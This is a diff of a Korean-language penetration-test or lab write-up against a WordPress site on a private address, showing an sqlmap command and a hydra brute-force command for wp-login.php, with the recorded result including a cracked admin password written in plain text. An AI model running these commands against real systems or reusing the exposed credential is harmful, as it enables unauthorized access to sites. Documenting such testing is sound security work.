@@ -98,11 +98,18 @@ sqlmap -u "http://10.0.0.254:8080/?s=test" --dbs
 
 **wp-login.php 브루트포스:**
 ```bash
-# Kali
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-    10.0.0.254 http-post-form \
-    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -s 8080
+# Kali (10.50.50.30)
+hydra -l admin -P /tmp/wp-passwords.txt 10.0.0.254 \
+    http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=login_error" \
+    -s 8080 -t 14 -w 5 -V
 ```
+
+**결과:**
+- 13회 시도 (12회 실패 + 1회 성공)
+- **크래킹 성공**: `login: admin / password: rlaquddn1@`
+- 소요 시간: 약 30초 (2026-08-26 03:05~03:06)
+
+> 참고: WordPress 한국어 설정이므로 실패 조건을 `F=login_error`로 지정 (기본 `F=Invalid`는 오탐 발생)
 
 **xmlrpc.php 멀티콜:**
 ```bash
